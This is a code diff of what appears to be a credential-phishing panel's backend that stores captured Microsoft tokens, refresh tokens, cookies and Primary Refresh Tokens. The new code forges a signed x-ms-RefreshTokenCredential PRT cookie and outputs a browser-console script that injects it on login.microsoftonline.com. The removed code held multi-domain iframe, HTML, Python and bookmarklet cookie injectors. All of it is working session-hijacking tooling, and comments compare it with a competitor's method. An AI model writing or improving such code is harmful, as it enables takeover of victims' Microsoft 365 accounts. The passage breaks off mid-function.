@@ -214,184 +214,100 @@ router.delete('/:id', userAuth, async (req, res) => {
 // ─── Generate cookie script ─────────────────────────────────────────
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
-    const [tokens] = await db.query(
-      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
-      [req.params.id, req.user.id]
-    );
-    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
+    const token = await loadTokenRow(req, res);
+    if (!token) return;
 
-    const token = tokens[0];
     const safeDecrypt = (val) => {
       if (!val) return null;
       try { return decrypt(val); } catch (e) { return null; }
     };
-    const accessToken = safeDecrypt(token.access_token_encrypted);
-    const refreshToken = safeDecrypt(token.refresh_token_encrypted);
-    const storedCookies = safeDecrypt(token.cookies_encrypted);
 
-    if (!accessToken && !refreshToken && !storedCookies) {
-      return res.status(400).json({ error: 'No tokens available' });
-    }
+    // ── GraphSpy PRT method ONLY ────────────────────────────────────────
+    // This endpoint produces exactly one cookie: the KDF-signed PRT JWT
+    // that GraphSpy's core.prt.generate_cookie() emits — an HS256 JWT
+    // signed with a key derived from the PRT's session key (kdf_ver 2),
+    // set as `x-ms-RefreshTokenCredential` on login.microsoftonline.com.
+    //
+    // Nothing else is produced. The previous refresh-token cookie exchange
+    // (fpc / x-ms-gateway-slice / stsservicecookie / sso_nonce), the
+    // stored-cookie fallback and the bookmarklet format were removed on
+    // purpose: they are different methods and are not what GraphSpy uses.
+    const prtkdf = require('../services/prtkdf');
 
-    var tenant = token.tenant || config.AZURE_TENANT || 'common';
-    var accountType = token.account_type || 'unknown';
-    var cookiesList = [];
-    var cookies = null;
-    var exchangeError = null;
-
-    // ALWAYS exchange refresh token first for fresh cookies (primary method)
-    if (refreshToken) {
-      try {
-        const cookieConverter = require('../services/cookieconverter');
-        const templateType = token.template_type || 'office';
-        console.log('[Tokens] Exchanging refresh token for fresh cookies...');
-        // Pass userId (req.user.id) so the stored DRS PRT cookie path works
-        const conversionResult = await cookieConverter.convertTokensToCookies(
-          refreshToken, templateType, tenant, null, accountType, req.user.id
-        );
-        if (conversionResult.success && conversionResult.cookies) {
-          cookies = conversionResult.cookies;
-          cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-          console.log('[Tokens] Fresh cookies generated:', cookiesList.length);
-        } else {
-          exchangeError = conversionResult.error || 'Token exchange returned no cookies';
-          console.error('[Tokens] Token exchange failed:', exchangeError);
-        }
-      } catch (convertErr) {
-        exchangeError = convertErr.message || 'Unknown conversion error';
-        console.error('[Tokens] Cookie conversion error:', exchangeError);
-      }
-    }
-
-    // Fallback: use stored cookies if exchange failed
-    if (cookiesList.length === 0 && storedCookies) {
-      console.log('[Tokens] Using stored cookies as fallback');
-      cookies = storedCookies;
-      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-    }
-
-    // Generate x-ms-RefreshTokenCredential PRT script (most reliable method)
-    var prtScript = null;
-    var prtError = null;
-    
-    // First, try to REFRESH stored PRT cookie from device_credentials table
-    // Always generate a FRESH PRT cookie - never reuse old ones
-    if (token.user_id && tenant && tenant !== 'common' && tenant !== 'organizations') {
-      try {
-        const cookieConverter = require('../services/cookieconverter');
-        console.log('[Tokens] Refreshing PRT cookie for user', token.user_id, 'tenant', tenant);
-        const freshPrt = await cookieConverter.refreshStoredPrtCookie(token.user_id, tenant, refreshToken);
-        if (freshPrt) {
-          console.log('[Tokens] Fresh PRT cookie generated from device credentials');
-          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${freshPrt}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
-        }
-      } catch (refreshErr) {
-        console.error('[Tokens] Failed to refresh PRT:', refreshErr.message);
-      }
-    }
-    
-    // If no stored device credentials, generate from refresh token with unique nonce
-    if (!prtScript && refreshToken) {
-      try {
-        const cookieConverter = require('../services/cookieconverter');
-        var tid = tenant;
-        var uid = '';
-        const idToken = safeDecrypt(token.id_token_encrypted);
-        if (idToken) {
-          try {
-            const idPayload = idToken.split('.')[1];
-            let padded = idPayload;
-            while (padded.length % 4) padded += '=';
-            const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
-            tid = decoded.tid || tid;
-            // Extract uid from id_token's oid claim (object id = uid)
-            uid = decoded.oid || decoded.sub || '';
-            console.log('[Tokens] Extracted from id_token: tid=' + tid + ', uid=' + uid.substring(0, 8) + '...');
-          } catch (e) { /* ignore */ }
-        }
-        const sessionKeyJwe = safeDecrypt(token.session_key_jwe);
-        if (sessionKeyJwe) {
-          try {
-            const parsed = JSON.parse(sessionKeyJwe);
-            if (parsed.client_info) {
-              const decoded = Buffer.from(parsed.client_info, 'base64').toString();
-              const info = JSON.parse(decoded);
-              uid = info.uid || uid; // Use session_key_jwe uid if available, otherwise keep id_token uid
-              console.log('[Tokens] Extracted uid from session_key_jwe: ' + uid.substring(0, 8) + '...');
-            }
-          } catch (e) { /* ignore */ }
-        }
-        // GraphSpy's PRT cookie needs the session key captured at device
-        // enrollment - without it there is no valid cookie to build.
-        let prtSessionKey = null;
-        try {
-          const deviceManager = require('../services/devicemanager');
-          const stored = await deviceManager.getStoredSessionKey(token.user_id, tid);
-          if (stored && stored.hasSessionKey) prtSessionKey = stored.sessionKey;
-        } catch (skErr) {
-          console.warn('[Tokens] PRT session key lookup failed:', skErr.message);
-        }
-        const prtCookieObj = await cookieConverter.generateXmsRefreshTokenCredential(
-        refreshToken,
-        accountType,
-        { tid: tid, uid: uid, scopes: 'openid profile email offline_access', sessionKey: prtSessionKey }
-      );
-        if (prtCookieObj && prtCookieObj.value) {
-          // IMPORTANT: Do NOT include domain attribute - browsers block third-party cookies
-          // Set cookie for current page only, then redirect to auth endpoint
-          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
-          console.log('[Tokens] PRT script generated from refresh token');
-        } else {
-          prtError = 'PRT cookie generation returned null value';
-        }
-      } catch (prtErr) {
-        prtError = prtErr.message || 'PRT generation failed';
-        console.error('[Tokens] PRT script generation error:', prtError);
-      }
-    }
-
-    if (cookiesList.length === 0 && !prtScript) {
-      return res.status(400).json({
-        error: 'No cookies could be generated',
-        exchange_error: exchangeError || 'No refresh token available',
-        prt_error: prtError,
-        hint: 'The refresh token may be expired or revoked. Try capturing new credentials.'
+    const prt = safeDecrypt(token.prt) || safeDecrypt(token.refresh_token_encrypted);
+    if (!prt) {
+      return res.status(409).json({
+        success: false,
+        error: 'No PRT available for this token. Capture a PRT first (POST /:id/prt-capture).'
       });
     }
 
-    // Generate simple direct injection script (works on login.microsoftonline.com)
-    var directScript = generateDirectInjectionScript(cookiesList, prtScript);
-
-    // Generate bookmarklet script (document.cookie format with correct domain)
-    var bookmarklet = '';
-    if (cookiesList.length > 0) {
-      var cookieConverter = require('../services/cookieconverter');
-      var formattedCookies = cookieConverter.formatCookiesForInjection(cookiesList);
-      bookmarklet = cookieConverter.generateBookmarkletScript(formattedCookies);
+    const materials = await resolveSessionKeyForToken(token);
+    if (!materials.hasSessionKey) {
+      return res.status(409).json({
+        success: false,
+        error: 'No PRT session key stored for this user+tenant. Capture a PRT first (POST /:id/prt-capture).'
+      });
     }
 
-    var scripts = {};
-    scripts.console = directScript;
-    scripts.prt = prtScript;
-    scripts.bookmarklet = bookmarklet;
-    scripts.html = cookiesList.length > 0 ? generateStandaloneHtml(cookiesList) : '';
-    scripts.python = cookiesList.length > 0 ? generatePythonScript(cookiesList) : '';
+    // Fetch a fresh srv_challenge nonce and derive the KDF signing key,
+    // exactly like GraphSpy (prt.generate_cookie -> get_srv_challenge_nonce).
+    const prtCookie = await prtkdf.generatePrtCookie({
+      prt,
+      sessionKey: materials.sessionKey,
+      nonce: (req.query && req.query.nonce) || null,
+    });
+
+    const cookieName = prtCookie.name || 'x-ms-RefreshTokenCredential';
+    const cookieDomain = prtCookie.domain || prtkdf.prtCookieDomain(prt);
+    const cookieValue = prtCookie.value;
+
+    // Persist alongside the other stored PRT cookie (same convention as
+    // refreshPrtCookie) so later flows reuse a known-good cookie.
+    try {
+      await db.query(
+        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
+        [encrypt(cookieValue), token.user_id, materials.tenant]
+      );
+    } catch (pErr) {
+      console.error('[Tokens] Failed to persist KDF PRT cookie:', pErr.message);
+    }
+
+    // GraphSpy's own instruction is "set x-ms-RefreshTokenCredential on
+    // login.microsoftonline.com, then reload". The script below does that
+    // verbatim — one cookie, then navigate. The cookie is valid ~5 minutes.
+    const script = [
+      '// VGenius PRT Cookie Injection (GraphSpy method)',
+      '// Paste into the browser console while on https://' + cookieDomain + '/',
+      '// (use a clean/incognito window so no other session interferes)',
+      '(function () {',
+      '  var name = ' + JSON.stringify(cookieName) + ';',
+      '  var value = ' + JSON.stringify(cookieValue) + ';',
+      '  var host = ' + JSON.stringify(cookieDomain) + ';',
+      '  document.cookie = name + "=" + value + "; domain=." + host + "; path=/; Secure; SameSite=None";',
+      '  console.log("[VGenius] PRT cookie set - valid for about 5 minutes");',
+      '  window.location.href = "https://" + host + "/";',
+      '})();'
+    ].join('\n');
+
+    console.log('[Tokens] GraphSpy PRT cookie generated for token', token.id, 'tenant', materials.tenant);
 
     res.json({
-      script: directScript,
-      prt_script: prtScript,
-      bookmarklet: bookmarklet,
-      scripts: scripts,
-      cookie_count: cookiesList.length,
-      cookies: cookiesList,
+      success: true,
+      method: 'prt',
+      script,
+      prt_cookie: cookieValue,
+      cookie_name: cookieName,
+      domain: cookieDomain,
+      cookies: [{ name: cookieName, value: cookieValue, domain: '.' + cookieDomain }],
+      cookie_count: 1,
+      tenant: materials.tenant,
       generated_at: new Date().toISOString(),
-      fresh: cookiesList.length > 0 && !storedCookies,
-      exchange_error: exchangeError,
-      used_fallback: cookiesList.length > 0 && !exchangeError ? false : !!storedCookies
+      message: 'PRT cookie generated (GraphSpy method). Valid for about 5 minutes.'
     });
   } catch (err) {
-    console.error('[Tokens] Cookie script error:', err);
-    res.status(500).json({ error: 'Failed to generate script', details: err.message });
+    console.error('[Tokens] Cookie script error:', err.message);
+    res.status(500).json({ success: false, error: 'Failed to generate PRT cookie: ' + err.message });
   }
 });
 
@@ -560,373 +476,6 @@ function buildCookieDomainMap(tenant, accountType) {
     }
   };
   return domainMap;
-}
-
-// ─── PROPER METHOD: Multi-domain cookie injection script ─
-// Fixes: Browser same-origin policy prevents setting cookies for different domains
-// from a single page. This script uses hidden iframes to navigate to each domain
-// and set cookies there, then redirects to Office.com when done.
-function generatePopupScript(cookies) {
-  if (!cookies || cookies.length === 0) return '';
-  
-  // Group cookies by domain
-  var domainMap = {};
-  for (var i = 0; i < cookies.length; i++) {
-    var c = cookies[i];
-    var d = c.domain || '.login.microsoftonline.com';
-    if (!domainMap[d]) domainMap[d] = [];
-    domainMap[d].push(c);
-  }
-  var domains = Object.keys(domainMap);
-  
-  var output = '// VGenius Multi-Domain Cookie Injection\n';
-  output += '(function() {\n';
-  output += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
-  output += '  var domainMap = ' + JSON.stringify(domainMap) + ';\n';
-  output += '  var domains = ' + JSON.stringify(domains) + ';\n';
-  output += '  var idx = 0;\n';
-  output += '  var injected = 0;\n';
-  output += '\n';
-  output += '  function setCookiesForDomain(domain) {\n';
-  output += '    var domainCookies = domainMap[domain] || [];\n';
-  output += '    for (var i = 0; i < domainCookies.length; i++) {\n';
-  output += '      var c = domainCookies[i];\n';
-  output += '      try {\n';
-  output += '        // Use .login.microsoftonline.com (NOT .microsoftonline.com) because\n';
-  output += '        // document.cookie CANNOT set parent-domain cookies.\n';
-  output += '        // The user MUST be on login.microsoftonline.com for this to work.\n';
-  output += '        document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=.login.microsoftonline.com; path=" + (c.path || "/") + "; Secure; SameSite=" + (c.sameSite || "None") + ";\n';
-  output += '        injected++;\n';
-  output += '      } catch(e) {}\n';
-  output += '    }\n';
-  output += '  }\n';
-  output += '\n';
-  output += '  function processNext() {\n';
-  output += '    if (idx >= domains.length) {\n';
-  output += '      console.log("[VGenius] All " + injected + " cookies injected!");\n';
-  output += '      setTimeout(function() { window.location.href = "https://www.office.com/"; }, 2000);\n';
-  output += '      return;\n';
-  output += '    }\n';
-  output += '    var domain = domains[idx++];\n';
-  output += '    console.log("[VGenius] Injecting cookies for " + domain);\n';
-  output += '    var iframe = document.createElement("iframe");\n';
-  output += '    iframe.style.display = "none";\n';
-  output += '    iframe.src = "https://" + domain.replace(/^\./, "") + "/";\n';
-  output += '    iframe.onload = function() {\n';
-  output += '      try { setCookiesForDomain(domain); } catch(e) {}\n';
-  output += '      setTimeout(processNext, 500);\n';
-  output += '    };\n';
-  output += '    iframe.onerror = function() { setTimeout(processNext, 300); };\n';
-  output += '    document.body.appendChild(iframe);\n';
-  output += '  }\n';
-  output += '\n';
-  output += '  setCookiesForDomain(window.location.hostname);\n';
-  output += '  setTimeout(processNext, 500);\n';
-  output += '})();\n';
-  
-  return output;
-}
-
-// Direct injection script - works on login.microsoftonline.com page
-// Sets cookies for current domain then redirects to trigger SSO
-function generateDirectInjectionScript(cookies, prtScript) {
-
-  // If we have a PRT script, add the PRT cookie to the cookies array (most important for SSO)
-
-  if (prtScript) {
-
-    var prtValue = (prtScript.match(/x-ms-RefreshTokenCredential=([^;]+)/) || ['', ''])[1];
-
-    if (prtValue && !cookies.some(function(c) { return c.name === 'x-ms-RefreshTokenCredential'; })) {
-
-      cookies.unshift({
-
-        name: 'x-ms-RefreshTokenCredential',
-
-        value: prtValue,
-
-        domain: '.login.microsoftonline.com',
-
-        path: '/',
-
-        sameSite: 'None'
-
-      });
-
-    }
-
-  }
-
-
-
-  if (!cookies || cookies.length === 0) {
-    return '';
-  }
-
-  var output = '// VGenius Cookie Injection Script\n';
-  output += '// IMPORTANT: Paste this in console on https://login.microsoftonline.com\n';
-  output += '// Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)\n';
-  output += '// because document.cookie CANNOT set parent-domain cookies.\n';
-  output += '(function() {\n';
-  output += '  "use strict";\n';
-  output += '  var injected = 0;\n';
-  output += '  var failed = 0;\n';
-  output += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
-  output += '\n';
-  output += '  console.log("[VGenius] Starting cookie injection... " + cookies.length + " cookies");\n';
-  output += '\n';
-  output += '  // Set cookies with domain=.login.microsoftonline.com\n';
-  output += '  // This is REQUIRED for SSO - cookies must be sent to all subdomains\n';
-  output += '  for (var i = 0; i < cookies.length; i++) {\n';
-  output += '    var c = cookies[i];\n';
-  output += '    try {\n';
-  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=.login.microsoftonline.com; path=" + (c.path || "/") + "; Secure; SameSite=" + (c.sameSite || "None") + ";\n';
-  output += '      injected++;\n';
-  output += '      console.log("[VGenius] Set: " + c.name);\n';
-  output += '    } catch(e) {\n';
-  output += '      failed++;\n';
-  output += '      console.error("[VGenius] Failed: " + c.name, e);\n';
-  output += '    }\n';
-  output += '  }\n';
-  output += '\n';
-  output += '  console.log("[VGenius] Successfully injected " + injected + "/" + cookies.length + " cookies");\n';
-  output += '\n';
-  output += '  // Wait 1.5s then redirect to trigger SSO\n';
-  output += '  setTimeout(function() {\n';
-  output += '    console.log("[VGenius] Redirecting to login.microsoftonline.com...");\n';
-  output += '    window.location.href = "https://login.microsoftonline.com/";\n';
-  output += '  }, 1500);\n';
-  output += '})();\n';
-
-  return output;
-}
-
-// ─── Standalone HTML injector page ──────────────────────────────────
-function generateStandaloneHtml(cookies) {
-  const cookieJson = JSON.stringify(cookies);
-  var domainMap = {};
-  for (var i = 0; i < cookies.length; i++) {
-    var c = cookies[i];
-    var d = c.domain || '.login.microsoftonline.com';
-    if (!domainMap[d]) domainMap[d] = [];
-    domainMap[d].push(c);
-  }
-  var domains = Object.keys(domainMap);
-  var domainMapJson = JSON.stringify(domainMap);
-  var domainsJson = JSON.stringify(domains);
-
-  var html = '<!DOCTYPE html>\\n<html lang=\"en\">\\n<head>\\n';
-  html += ' <meta charset=\"UTF-8\">\\n';
-  html += ' <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\\n';
-  html += ' <title>VGenius Cookie Injector</title>\\n';
-  html += ' <style>\\n';
-  html += ' * { margin: 0; padding: 0; box-sizing: border-box; }\\n';
-  html += ' body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; padding: 40px; max-width: 700px; margin: 0 auto; background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%); color: #e0e0e0; min-height: 100vh; }\\n';
-  html += ' h1 { color: #00ccff; margin-bottom: 20px; text-align: center; }\\n';
-  html += ' .info-box { background: rgba(0,204,255,0.1); border: 1px solid rgba(0,204,255,0.3); border-radius: 8px; padding: 20px; margin: 20px 0; }\\n';
-  html += ' .info-box p { margin: 8px 0; font-size: 14px; }\\n';
-  html += ' .info-box strong { color: #00ccff; }\\n';
-  html += ' button { padding: 14px 28px; cursor: pointer; background: linear-gradient(135deg, #00ccff, #0099cc); color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; margin: 8px; transition: all 0.2s; }\\n';
-  html += ' button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); }\\n';
-  html += ' .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }\\n';
-  html += ' .status { margin-top: 16px; padding: 16px; border-radius: 8px; font-size: 14px; }\\n';
-  html += ' .success { background: rgba(0,255,0,0.1); border: 1px solid rgba(0,255,0,0.3); color: #0f0; }\\n';
-  html += ' .error { background: rgba(255,0,0,0.1); border: 1px solid rgba(255,0,0,0.3); color: #f00; }\\n';
-  html += ' .progress { margin-top: 16px; }\\n';
-  html += ' .progress-bar { height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; }\\n';
-  html += ' .progress-fill { height: 100%; background: linear-gradient(90deg, #00ccff, #00ff88); width: 0%; transition: width 0.3s; }\\n';
-  html += ' .progress-text { margin-top: 8px; font-size: 13px; color: #888; }\\n';
-  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #333; border-radius: 8px; overflow-x: auto; font-size: 11px; color: #0f0; max-height: 300px; white-space: pre-wrap; word-break: break-all; }\\n';
-  html += ' .domain-list { margin: 12px 0; font-size: 12px; color: #888; }\\n';
-  html += ' .domain-list span { display: inline-block; background: rgba(0,204,255,0.1); padding: 2px 8px; border-radius: 4px; margin: 2px; }\\n';
-  html += ' </style>\\n';
-  html += '</head>\\n<body>\\n';
-  html += ' <h1>VGenius Cookie Session Injector</h1>\\n';
-  html += ' <div class=\"info-box\">\\n';
-  html += '  <p><strong>Cookies to inject:</strong> ' + cookies.length + '</p>\\n';
-  html += '  <p><strong>Domains:</strong></p>\\n';
-  html += '  <div class=\"domain-list\">' + domains.map(function(d) { return '<span>' + d + ' (' + (domainMap[d]||[]).length + ')</span>'; }).join('') + '</div>\\n';
-  html += ' </div>\\n';
-  html += ' <div style=\"text-align:center;\">\\n';
-  html += '  <button onclick=\"injectCookies()\" id=\"injectBtn\">Start Cookie Injection</button>\\n';
-  html += '  <button class=\"btn-secondary\" onclick=\"showScript()\" id=\"scriptBtn\">Show Console Script</button>\\n';
-  html += ' </div>\\n';
-  html += ' <div class=\"progress\" id=\"progressDiv\" style=\"display:none;\">\\n';
-  html += '  <div class=\"progress-bar\"><div class=\"progress-fill\" id=\"progressFill\"></div></div>\\n';
-  html += '  <p class=\"progress-text\" id=\"progressText\"></p>\\n';
-  html += ' </div>\\n';
-  html += ' <div class=\"status\" id=\"status\" style=\"display:none;\"></div>\\n';
-  html += ' <div id=\"scriptDiv\" style=\"display:none;margin-top:20px;\">\\n';
-  html += '  <p style=\"font-size:12px;color:#888;margin-bottom:8px;\">Copy this script and paste it into the browser console on the Microsoft login page:</p>\\n';
-  html += '  <pre id=\"scriptContent\"></pre>\\n';
-  html += '  <button onclick=\"copyScript()\" style=\"margin-top:8px;\">Copy Script</button>\\n';
-  html += ' </div>\\n';
-  html += ' <script>\\n';
-  html += ' var cookies = ' + cookieJson + ';\\n';
-  html += ' var domainMap = ' + domainMapJson + ';\\n';
-  html += ' var domains = ' + domainsJson + ';\\n';
-  html += ' var statusDiv = document.getElementById(\"status\");\\n';
-  html += ' var progressDiv = document.getElementById(\"progressDiv\");\\n';
-  html += ' var progressFill = document.getElementById(\"progressFill\");\\n';
-  html += ' var progressText = document.getElementById(\"progressText\");\\n';
-  html += ' var injectBtn = document.getElementById(\"injectBtn\");\\n';
-  html += '\\n';
-  html += ' function setStatus(msg, type) {\\n';
-  html += '   statusDiv.style.display = \"block\";\\n';
-  html += '   statusDiv.className = \"status \" + type;\\n';
-  html += '   statusDiv.innerHTML = msg;\\n';
-  html += ' }\\n';
-  html += '\\n';
-  html += ' function updateProgress(current, total, domain) {\\n';
-  html += '   progressDiv.style.display = \"block\";\\n';
-  html += '   var pct = (current / total) * 100;\\n';
-  html += '   progressFill.style.width = pct + \"%\";\\n';
-  html += '   progressText.textContent = \"Domain \" + current + \"/\" + total + \": \" + domain;\\n';
-  html += ' }\\n';
-  html += '\\n';
-  html += ' function injectCookies() {\\n';
-  html += '   injectBtn.disabled = true;\\n';
-  html += '   injectBtn.textContent = \"Injecting...\";\\n';
-  html += '   setStatus(\"Starting multi-domain injection...\", \"success\");\\n';
-  html += '   progressDiv.style.display = \"block\";\\n';
-  html += '   var idx = 0;\\n';
-  html += '   var totalDomains = domains.length;\\n';
-  html += '   var totalCookies = cookies.length;\\n';
-  html += '   var injected = 0;\\n';
-  html += '   function setCookiesForDomain(domain) {\\n';
-  html += '     var domainCookies = domainMap[domain] || [];\\n';
-  html += '     for (var i = 0; i < domainCookies.length; i++) {\\n';
-  html += '       var c = domainCookies[i];\\n';
-  html += '       try {\\n';
-  html += '         // Use .login.microsoftonline.com (NOT .microsoftonline.com)\\n';
-html += '         // because document.cookie CANNOT set parent-domain cookies.\\n';
-html += '         document.cookie = c.name + \"=\" + encodeURIComponent(c.value) + \"; domain=.login.microsoftonline.com; path=\" + (c.path || \"/\") + \"; Secure; SameSite=\" + (c.sameSite || \"None\") + \";\\n';
-  html += '         injected++;\\n';
-  html += '       } catch(e) { console.warn(\"Failed to set cookie on \" + domain + \": \" + c.name); }\\n';
-  html += '     }\\n';
-  html += '   }\\n';
-  html += '   function processNext() {\\n';
-  html += '     if (idx >= totalDomains) {\\n';
-  html += '       injectBtn.disabled = false;\\n';
-  html += '       injectBtn.textContent = \"Done!\";\\n';
-  html += '       setStatus(\"Successfully injected \" + injected + \"/\" + totalCookies + \" cookies across \" + totalDomains + \" domains! Redirecting to Office.com...\", \"success\");\\n';
-  html += '       setTimeout(function() { window.location.href = \"https://www.office.com/\"; }, 3000);\\n';
-  html += '       return;\\n';
-  html += '     }\\n';
-  html += '     var domain = domains[idx++];\\n';
-  html += '     updateProgress(idx, totalDomains, domain);\\n';
-  html += '     var iframe = document.createElement(\"iframe\");\\n';
-  html += '     iframe.style.display = \"none\";\\n';
-  html += '     var targetUrl = \"https://\" + domain.replace(/^\\./, \"\") + \"/\";\\n';
-  html += '     iframe.src = targetUrl;\\n';
-  html += '     iframe.onload = function() {\\n';
-  html += '       try { setCookiesForDomain(domain); } catch(e) {}\\n';
-  html += '       setTimeout(processNext, 800);\\n';
-  html += '     };\\n';
-  html += '     iframe.onerror = function() { setTimeout(processNext, 500); };\\n';
-  html += '     document.body.appendChild(iframe);\\n';
-  html += '   }\\n';
-  html += '   setTimeout(processNext, 500);\\n';
-  html += ' }\\n';
-  html += '\\n';
-  html += ' function showScript() {\\n';
-  html += '   var scriptDiv = document.getElementById(\"scriptDiv\");\\n';
-  html += '   var scriptContent = document.getElementById(\"scriptContent\");\\n';
-  html += '   scriptDiv.style.display = scriptDiv.style.display === \"none\" ? \"block\" : \"none\";\\n';
-  html += '   if (scriptDiv.style.display === \"block\") {\\n';
-  html += '     var script = \"// VGenius Multi-Domain Cookie Injection\\n\";\\n';
-  html += '     script += \"(function() {\\n\";\\n';
-  html += '     script += \"  var cookies = \" + JSON.stringify(cookies) + \";\\n\";\\n';
-  html += '     script += \"  cookies.forEach(function(c) {\\n\";\\n';
-  html += '     script += \"    try {\\n\";\\n';
-  html += '     script += \"      // Use .login.microsoftonline.com (NOT .microsoftonline.com)\\n\";\\n';
-html += '     script += \"      document.cookie = c.name + \\\"=\\\" + encodeURIComponent(c.value) + \\\"; domain=.login.microsoftonline.com; path=\\\" + (c.path || \\\"/\\\") + \\\"; Secure; SameSite=\\\" + (c.sameSite || \\\"None\\\") + \\\";\\n\";\\n';
-  html += '     script += \"    } catch(e) {}\\n\";\\n';
-  html += '     script += \"  });\\n\";\\n';
-  html += '     script += \"  console.log(\\\"[VGenius] Injected \" + cookies.length + \" cookies. Refresh the page.\\\");\\n\";\\n';
-  html += '     script += \"  setTimeout(function() { window.location.href = \\\\\\\"https://www.office.com/\\\\\\\"; }, 2000);\\n\";\\n';
-  html += '     script += \"})();\";\\n';
-  html += '     scriptContent.textContent = script;\\n';
-  html += '   }\\n';
-  html += ' }\\n';
-  html += '\\n';
-  html += ' function copyScript() {\\n';
-  html += '   var content = document.getElementById(\"scriptContent\").textContent;\\n';
-  html += '   navigator.clipboard.writeText(content).then(function() {\\n';
-  html += '     setStatus(\"Script copied to clipboard!\", \"success\");\\n';
-  html += '   }).catch(function() {\\n';
-  html += '     var ta = document.createElement(\"textarea\");\\n';
-  html += '     ta.value = content; ta.style.position = \"fixed\"; ta.style.opacity = \"0\";\\n';
-  html += '     document.body.appendChild(ta); ta.select(); document.execCommand(\"copy\");\\n';
-  html += '     document.body.removeChild(ta);\\n';
-  html += '     setStatus(\"Script copied to clipboard!\", \"success\");\\n';
-  html += '   });\\n';
-  html += ' }\\n';
-  html += ' </script>\\n';
-  html += '</body></html>';
-
-  return html;
-}
-
-// ─── Python requests script ─────────────────────────────────────────
-function generatePythonScript(cookies) {
-  var script = '#!/usr/bin/env python3\n';
-  script += '# VGenius Cookie Session Injector - Python Version\n\n';
-  script += 'import requests\n';
-  script += 'from datetime import datetime\n\n';
-  script += 'cookies = ' + JSON.stringify(cookies, null, 2) + '\n\n';
-  script += 'session = requests.Session()\n\n';
-  script += 'print("Injecting cookies...")\n';
-  script += 'for cookie in cookies:\n';
-  script += ' try:\n';
-  script += ' session.cookies.set(\n';
-  script += ' name=cookie["name"],\n';
-  script += ' value=cookie["value"],\n';
-  script += ' domain=cookie["domain"],\n';
-  script += ' secure=True,\n';
-  script += ' samesite="None"\n';
-  script += ' )\n';
-  script += ' print(f"Injected: {cookie[\'name\']}")\n';
-  script += ' except Exception as e:\n';
-  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
-  script += 'print("\\nSession ready!")\n';
-  script += 'print(f"Total cookies: {len(cookies)}")\n';
-  script += 'print(f"Generated at: {datetime.now()}")\n';
-
-  return script;
-}
-
-// ─── Bookmarklet-based injector (competitor's proven document.cookie method) ──
-function generateInjectorScript(cookies, clientId, tenant) {
-  var cookieJson = JSON.stringify(cookies);
-
-  // Build bookmarklet code using document.cookie method
-  // NOTE: Do NOT use encodeURIComponent on cookie values - it corrupts PRT/ESTSAUTH values
-  // Microsoft cookies contain base64url chars (=, /, +) that must be preserved as-is
-var bookmarklet = 'javascript:(function(){' + 
-  'var cookies=' + cookieJson + ';' + 
-  'cookies.forEach(function(c){' + 
-  'var domain=c.domain||".login.microsoftonline.com";' + 
-  'document.cookie=c.name+"="+c.value+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
-  '});' + 
-  'setTimeout(function(){' + 
-   'window.location.href="https://www.office.com/";' + 
-  '},2000);' + 
-  '})()';
-
-  var script = '<!DOCTYPE html>\n<html><head><title>VGenius Cookie Injector</title></head><body>\n';
-  script += '<h1 style="color:#00ccff">Cookie Injection Ready</h1>\n';
-  script += '<p>Drag the button below to your bookmarks bar, then click it on the Microsoft login page.</p>\n';
-  script += '<div id="bookmarklet"></div>\n';
-  script += '<div id="status">Instructions will appear here.</div>\n';
-  script += '<script>\n';
-  script += 'var bookmarklet = "' + bookmarklet.replace(/"/g, '\\"') + '";\n';
-  script += 'var div = document.getElementById("bookmarklet");\n';
-  script += 'div.innerHTML = \'<a href="\' + bookmarklet + \'" style="display:inline-block;padding:15px 30px;background:#00ccff;color:#000;text-decoration:none;border-radius:6px;font-weight:bold;">Inject Cookies</a>\';\n';
-  script += '</script>\n';
-  script += '</body></html>';
-
-  return script;
 }
 
 // ─── Manual cookie renewal ──────────────────────────────────────────
@@ -1133,7 +682,10 @@ router.get('/inject-script', userAuth, async (req, res) => {
   }
 });
 
-// ─── PRT-only cookie injection script (exact competitor format) ──────
+// ─── PRT-only cookie injection script (GraphSpy's method) ─────────────
+// Produces exactly one cookie — the KDF-signed PRT JWT that GraphSpy's
+// core.prt.generate_cookie() emits — set as x-ms-RefreshTokenCredential
+// on the PRT's host, then reload. No other cookie is produced.
 router.get('/prt-inject', userAuth, async (req, res) => {
   try {
     const { token_id } = req.query;
@@ -1148,72 +700,35 @@ router.get('/prt-inject', userAuth, async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
-    const refreshToken = decrypt(token.refresh_token_encrypted);
-    const idToken = decrypt(token.id_token_encrypted);
+    const prtkdf = require('../services/prtkdf');
 
-    if (!refreshToken) {
-      return res.status(400).json({ error: 'No refresh token available' });
+    const prt = safeDecrypt(token.prt) || safeDecrypt(token.refresh_token_encrypted);
+    if (!prt) {
